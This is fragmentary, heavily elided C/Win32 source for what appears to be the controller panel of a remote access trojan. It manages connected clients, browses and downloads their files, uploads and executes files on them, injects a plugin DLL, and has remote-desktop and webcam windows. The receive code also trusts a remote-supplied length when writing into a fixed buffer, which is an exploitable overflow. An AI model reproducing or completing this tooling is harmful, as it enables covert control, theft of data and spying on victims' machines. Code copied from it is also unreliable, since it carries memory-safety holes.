...
DWORD WINAPI ClientHandlerThread(LPVOID lpParam) {
    ...
    while (true) {
        ...
        if (cmd == 0x02 || cmd == 0x04) { 
            ...
            if (activeClient == client && hFileWindow && IsWindowVisible(hFileWindow)) {
                PostMessage(hFileWindow, WM_FM_UPDATE, 0, 0);
            }
        }
        else if (cmd == 0x25) { 
            DWORD nameLen = 0;
            if (!RecvAll(client->sock, (char*)&nameLen, 4)) break;
            
            char fileName[MAX_PATH] = {0};
            if (!RecvAll(client->sock, fileName, nameLen)) break;
            fileName[nameLen] = '\0';
            
            DWORD fileSize = 0;
            if (!RecvAll(client->sock, (char*)&fileSize, 4)) break;
            
            char localPath[MAX_PATH];
            sprintf(localPath, "Downloaded_%s", fileName);
            
            EnterCriticalSection(&client->cs);
            strcpy(client->status, "Receiving File Transfer...");
            LeaveCriticalSection(&client->cs);
            PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0);
            
            if (RecvFileToDisk(client->sock, localPath, fileSize)) {
                EnterCriticalSection(&client->cs);
                strcpy(client->status, "Download Complete.");
                LeaveCriticalSection(&client->cs);
            } else {
                EnterCriticalSection(&client->cs);
                strcpy(client->status, "Download Failed/Corrupted.");
                LeaveCriticalSection(&client->cs);
            }
            PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0);
        }
...
void PopulateFileListView(char* data) {
    ...
    if (strchr(data, '|') && !strchr(data, '\n')) {
        ...
        while (token) {
            ...
            ListView_SetItemText(hFileListView, index, 1, "DRIVE");
            token = strtok(NULL, "|");
        }
    } else {
        LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_TEXT; 
        ...
        int index = ListView_InsertItem(hFileListView, &lvi);
        ListView_SetItemText(hFileListView, index, 1, "DIR");
        ...
        while (line) {
            ...
            if (sscanf(line, "%[^|]|%[^|]|%s", type, name, size) == 3) {
                ...
                ListView_SetItemText(hFileListView, index, 1, type);
                ListView_SetItemText(hFileListView, index, 2, size);
            }
            line = strtok(NULL, "\n");
        }
    }
    ...
    switch (msg) {
        ...
        case WM_FM_UPDATE:
            if (activeClient && activeClient->latestFileList) {
                ...
                char* copy = _strdup(activeClient->latestFileList);
                LeaveCriticalSection(&activeClient->cs);
                PopulateFileListView(copy);
                free(copy);
            }
            return 0;
        case WM_NOTIFY: {
                ...
                if (sel != -1 && activeClient) {
                    ...
                    if (strcmp(type, "DRIVE") == 0 || strcmp(type, "DIR") == 0) {
                        if (strcmp(name, "..") == 0) {
                            ...
                            if (lastSlash && lastSlash != currentRemotePath) *lastSlash = '\0';
                            else strcpy(currentRemotePath, ""); 
                        } else {
                        ...
                        if (cmd == 0x21) {
                            DWORD len = (DWORD)strlen(currentRemotePath);
                            send(activeClient->sock, (char*)&len, 4, 0);
                            send(activeClient->sock, currentRemotePath, len, 0);
                        }
                    }
                }
            }
                ...
                if (activeClient) {
                    ...
                    if (sel != -1) {
                        ...
                        if (strcmp(type, "FILE") == 0) {
                            AppendMenuA(hMenu, MF_STRING, IDM_FM_EXECUTE, "Execute File");
                            AppendMenuA(hMenu, MF_STRING, IDM_FM_DOWNLOAD, "Download File");
                        } else if (strcmp(type, "DIR") == 0) {
                            AppendMenuA(hMenu, MF_STRING, IDM_FM_DL_DIR, "Download Directory (ZIP)");
                        }
                    ...
                    char name[MAX_PATH];
                    if (sel != -1) ListView_GetItemText(hFileListView, sel, 0, name, MAX_PATH);
                    ...
                    if (selection == IDM_FM_EXECUTE) {
                        ...
                        send(activeClient->sock, (char*)&cmd, 1, 0);
                        send(activeClient->sock, (char*)&len, 4, 0);
                        send(activeClient->sock, fullPath, len, 0);
                    }
                        ...
                        OPENFILENAMEA ofn; char szFile[MAX_PATH] = {0};
                        ...
                        if (GetOpenFileNameA(&ofn)) {
                            ...
                            if (fSize > 0) {
                                const char* justName = strrchr(szFile, '\\');
                                justName = justName ? justName + 1 : szFile;
                                
                                char destPath[MAX_PATH];
                                sprintf(destPath, "%s\\%s", currentRemotePath, justName);
                                
                                BYTE cmd = 0x26; 
                                DWORD pathLen = (DWORD)strlen(destPath);
                                
                                send(activeClient->sock, (char*)&cmd, 1, 0);
                                send(activeClient->sock, (char*)&pathLen, 4, 0);
                                send(activeClient->sock, destPath, pathLen, 0);
                                send(activeClient->sock, (char*)&fSize, 4, 0);
                                
                                if (SendFileFromDisk(activeClient->sock, szFile)) {
                                    MessageBoxA(hwnd, "Upload Completed.", "Success", MB_OK);
                                } else {
                                    MessageBoxA(hwnd, "Upload Interrupted.", "Error", MB_ICONERROR);
                                }
                            }
                        }
                    }
    ...
    switch (msg) {
        ...
        case WM_COMMAND: {
            ...
            if (sel != -1) {
                ...
                if (LOWORD(wParam) == IDM_FILE_MGR) {
                    strcpy(currentRemotePath, ""); 
                    cmd = 0x20;
                    send(activeClient->sock, (char*)&cmd, 1, 0);
                    ShowWindow(hFileWindow, SW_SHOW); 
                    UpdateWindow(hFileWindow);
                    cmd = 0; 
                }
                
                if (LOWORD(wParam) == IDM_INJECT_PLUG) {
                    char pluginPath[MAX_PATH];
                    strcpy(pluginPath, "C:\\Temp\\Plugin.dll"); 
                    cmd = 0x30;
                    DWORD len = (DWORD)strlen(pluginPath);
                    send(activeClient->sock, (char*)&cmd, 1, 0);
                    send(activeClient->sock, (char*)&len, 4, 0);
                    send(activeClient->sock, pluginPath, len, 0);
                    cmd = 0;
                }
        ...
        case WM_CLIENT_DISCONNECT: {
            ...
            if (activeClient == client) { 
                activeClient = NULL; 
                ShowWindow(hRdpWindow, SW_HIDE); 
                ShowWindow(hCamWindow, SW_HIDE); 
                ShowWindow(hFileWindow, SW_HIDE);
            }
